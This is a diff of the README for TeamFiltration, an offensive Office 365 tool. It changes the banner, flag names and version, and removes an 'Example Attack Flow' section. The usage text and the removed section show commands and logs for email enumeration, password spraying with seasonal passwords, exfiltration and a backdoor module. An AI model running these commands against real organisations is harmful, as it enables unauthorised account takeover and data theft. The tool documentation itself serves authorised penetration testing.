@@ -23,39 +23,39 @@ You will need to provide a json config file to be able to use TeamFiltration. Th
 
 ```
 
-  ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╗
+  ╓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╖
  ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
-╬╬╬╬┤                              ╠╬╬╝╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
-╬╬╬╬╣                              │      ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
-╬╬╬╬╣                              ││      ╚╬╬╝╚ └╚╝╬╬╬╬╬╬
-╬╬╬╬╣         ╔╦╦╬╬╬╬╬╬╦╦╗         ││       │        ╬╬╬╬╬
-╬╬╬╬╣     ╔╬╬╬╝╝┘      ╚╝╝╬╬╬┐     ││       ││       └╬╬╬╬
-╬╬╬╬┤    ╬╬╝╚╩╬╗╔          ╚╬╬╬    ││       ││        ╬╬╬╬
-╬╬╬╬┤   ╬╝      ╚╬╬╗╗ ╔      ╚╬╗   ││      ├││        ╬╬╬╬
-╬╬╬╬┤  ╬╬     ╔╗   ╚╬╬╬╬╬╬╦    ╬╬  │┌    ╔╬┤││       ╔╬╬╬╬
-╬╬╬╬┤ ╔╬┤     ╬╬╬   ╬╬╬╬╬╬╬╬╝╝╝╬╬╗ ╠╬╬╬╬╬╬╬╬╬╗      ┌╬╬╬╬╬
-╬╬╬╬┤ ╬╬┤     ╚╩┘   ╚╬╬╬╬╬╩    ╠╬╬ ╚╝╝╝╝╝╝╝╝╝╬╬╗╗╗╦╬╬╬╬╬╬╬
-╬╬╬╬┤ ╬╬┤                      ╠╬╬ ││         ╬╬╬╬╬╬╬╬╬╬╬╬
-╬╬╬╬┤  ╬╬   ╦╗            ╗╗   ╬╬  ││         │       ╬╬╬╬
-╬╬╬╬┤  └╬┐   ╚╬╗╗      ╔╬╬╝   ╔╬┘  ││         │       ╬╬╬╬
-╬╬╬╬┤   └╬╗    ╚╩╩╬╬╬╩╩╝╝   ╔╬╬    ││         │       ╬╬╬╬
-╬╬╬╬┤    ╚╬╬╬╗           ┌╗╬╬╝┘    ││         │       ╬╬╬╬
-╬╬╬╬┤       ╚╩╬╬╬╦╦╦╦╦╦╬╬╬╝╝       ││         │       ╬╬╬╬
-╬╬╬╬┤            ╚╚╝╝╝╝            ││         │       ╬╬╬╬
-╬╬╬╬┤                              ││         │    ╔╗╬╬╬╬╬
+╬╬╬╬┤                              ╟╬╬╜╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+╬╬╬╬╡                              │      ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+╬╬╬╬╡                              ││      ╙╬╬╜╘ └╙╜╬╬╬╬╬╬
+╬╬╬╬╡         ╓╥╥╬╬╬╬╬╬╥╥╖         ││       │        ╬╬╬╬╬
+╬╬╬╬╡     ╓╬╫╬╜╜┘      ╙╜╜╬╫╬┐     ││       ││       └╬╬╬╬
+╬╬╬╬┤    ╬╬╜╙╩╬╖╓          ╙╬╬╬    ││       ││        ╬╬╬╬
+╬╬╬╬┤   ╬╜      ╙╬╫╖╖ ╓      ╙╬╖   ││      ├││        ╬╬╬╬
+╬╬╬╬┤  ╬╬     ╓╖   ╙╬╬╬╬╬╬╦    ╬╬  │┌    ╓╬┤││       ╓╬╬╬╬
+╬╬╬╬┤ ╓╬┤     ╬╬╬   ╬╬╬╬╬╬╬╬╜╜╜╬╬╖ ╟╬╬╬╬╬╬╬╬╬╕      ┌╬╬╬╬╬
+╬╬╬╬┤ ╬╬┤     ╙╩┘   ╙╬╬╬╬╬╩    ╟╬╬ ╙╜╜╜╜╜╜╜╜╜╬╬╖╖╖╦╬╬╬╬╬╬╬
+╬╬╬╬┤ ╬╬┤                      ╟╬╬ ││         ╬╬╬╬╬╬╬╬╬╬╬╬
+╬╬╬╬┤  ╬╬   ╦╖            ╗╖   ╬╬  ││         │       ╬╬╬╬
+╬╬╬╬┤  └╬┐   ╙╬╖╖      ╓╬╬╜   ╓╬┘  ││         │       ╬╬╬╬
+╬╬╬╬┤   └╬╖    ╙╩╨╬╬╬╩╨╜╜   ╒╬╬    ││         │       ╬╬╬╬
+╬╬╬╬┤    ╙╬╬╬╖           ┌╖╫╬╜┘    ││         │       ╬╬╬╬
+╬╬╬╬┤       ╙╩╬╬╬╥╥╥╥╥╥╫╬╬╜╜       ││         │       ╬╬╬╬
+╬╬╬╬┤            ╙╙╜╜╜╛            ││         │       ╬╬╬╬
+╬╬╬╬┤                              ││         │    ╓╖╬╬╬╬╬
 ╬╬╬╬┤                              ││         ╬╦╦╬╬╬╬╬╬╬╬╬
-╬╬╬╬┤                              ││     ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
-╬╬╬╬┤                              ╬╬╬╗╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+╬╬╬╬┤                              ││     ╓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+╬╬╬╬┤                              ╬╬╬╖╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
 ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
- └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╝
-   ╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝
+ └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╜
+   ╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜
 
-[+] TeamFiltration V0.3.3.6 PUBLIC, created by @Flangvik @TrustedSec
+[] TeamFiltration V0.3.3.7 PUBLIC, created by @Flangvik @TrustedSec
 Usage:
 
    --outpath     Output path to store database and exfiltrated information (Needed for all modules)
 
-   --config      Local path to your TeamFiltration.json configuration file, if not provided will load from current path
+   --config      Local path to your TeamFiltration.json configuration file, if not provided will load from the current path
 
    --exfil       Load the exfiltration module  
 
@@ -81,14 +81,13 @@ Usage:
          --months-only         Password generated for spraying will only be based on months
          --common-only         Spray with the top 20 most common passwords
          --combo               Path to a combolist of username:password
-         --exlude              Path to a list of emails to exclude from spraying
+         --exclude              Path to a list of emails to exclude from spraying
 
          --sleep-min           Minimum minutes to sleep between each full rotation of spraying default=60
          --sleep-max           Maximum minutes to sleep between each full rotation of spraying default=100
          --delay               Delay in seconds between each individual authentication attempt. default=0
-         --push-userkey        Pushover user API key for notifications when credentials are found)
-         --push-appkey         Pushover app API key for notifications when credentials are found)
-         --push-locked         Get Pushover notifications when an sprayed account gets locked (requires --push-userkey and --push-appkey)
+         --push                Get Pushover notifications when valid credentials are found (requires pushover keys in config)
+         --push-locked         Get Pushover notifications when an sprayed account gets locked (requires pushover keys in config)
          --force               Force the spraying to proceed even if there is less the <sleep> time since the last attempt
 
    --enum        Load the enumeration module
@@ -108,8 +107,8 @@ Usage:
 
    Examples:
 
-        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push-userkey XXX --push-appkey XXX
-        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --push-userkey XXX --push-appkey XXX --push-locked --months-only --exlude C:\Clients\2021\FooBar\Exclude_Emails.txt
+        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push
+        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --all 
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --aad  
@@ -119,79 +118,6 @@ Usage:
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --backdoor
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --database
-```
-
-## Example Attack Flow
-
-Start the external by performing recon using Dehashed, Linkedin, Hunter.io, Google Dorks etc.
-When you figured out what the email syntax for the company is, you are ready to enumerate and validate emails that exists within the target o365 tenant
-
-The --outpath is needed for all modules within TeamFiltration, and acts as a localised workspace / project folder for all information related to this attack/client to be stored
-
-Start the enum with the following command, where --domain is your target client domain name
-```
- TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
-```
-
-Choose the enumerated email syntax. This will pull different emails and syntaxes from the statistically likely usernames repo. Once you select a syntax, TeamFiltration will use its private, passive and unsaturated Teams method to validate them (hence the --validate-teams argument)
-
-```
-[♥] TeamFiltration V0.3.2.6, created by @Flangvik
-[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
-[+] No usernames list provided, pulling statistically-likely-usernames
-[?] Provide a target domain/tenant (e.g legitcorp.net) #> legitcorp.net
-    |=> [1] john.smith@legitcorp.net
-    |=> [2] john@legitcorp.net
-    |=> [3] johnjs@legitcorp.net
-    |=> [4] johns@legitcorp.net
-    |=> [5] johnsmith@legitcorp.net
-    |=> [6] jsmith@legitcorp.net
-    |=> [7] smith@legitcorp.net
-    |=> [8] smithj@legitcorp.net
-    |=> [9] john_smith@legitcorp.net
-
-[?] Select an email format #> 1
-```
-
-If you would like to supply your own email list to validate, simply use the --usernames argument.
-Validated emails get stored automatically in the TeamFiltration.db file located in the --outpath folder. This way, there is no need to supply data manually through each module.
-
-```
-[ENUM] 24.05.2021 12:31:05 EST Filtering out previusly attempted accounts
-[ENUM] 24.05.2021 12:31:06 EST Enumerating 248231 possible accounts, this will take ~14 minutes
-[ENUM] 24.05.2021 12:31:07 EST Successfully got Teams token for sacrificial account
-[ENUM] 24.05.2021 12:31:07 EST Loaded 248231 usernames
-[ENUM] 24.05.2021 12:31:08 EST enita.lintz@legitcorp.net valid!
-[ENUM] 24.05.2021 12:31:09 EST bruce.wayne@legitcorp.net valid!
-[ENUM] 24.05.2021 12:31:13 EST herminia.oliva@legitcorp.net valid!
-[ENUM] 24.05.2021 12:31:13 EST thomas.anderson@legitcorp.net valid!
-[ENUM] 24.05.2021 12:31:17 EST sharilyn.penning@legitcorp.net valid!
-```
-Next up we will spray the validated emails with the following command
-
-```
- TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
-```
-
-When no passwords list is provided, TeamFiltration will generate its own based on the Month, Season, and year!
-If you would like to supply your own passwordlist, simply use the --passwords argument.
-
-```
-[♥] TeamFiltration V0.3.2.6, created by @Flangvik
-[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
-[SPRAY] 24.05.2021 12:33:54 EST Sleeping between 60-100 minutes for each round
-[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed renita.lintz@legitcorp.net:Spring2021!          => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed bruce.wayne@legitcorp.net:Spring2021!           => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed herminia.oliva@legitcorp.net:Spring2021!        => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed biff.tannen@legitcorp.net:Spring2021!           => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed elijah.blakley@legitcorp.net:Spring2021!        => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed thomas.anderson@legitcorp.net:Spring2021!       => VALID NO MFA!
-[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed chris.kelly@legitcorp.net:Spring2021!           => INVALID
-[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed deadpool@legitcorp.net:Spring2021!              => INVALID
-[SPRAY] us-west-1 24.05.2021 12:34:00 EST Sprayed sharilyn.penning@legitcorp.net:Spring2021!      => INVALID
-[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed master.kevin@legitcorp.net:Spring2021!          => INVALID
-[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed adam.wally@legitcorp.net:Spring2021!            => INVALID
-[SPRAY] 24.05.2021 12:34:01 EST Sleeping 78 before next spray
 ```
 
 With a set of valid credentials found, we can move into the exfil module. The valid credentials and account information is stored in the teamfiltration database, so you do not need to provide them when using the --exfil module.
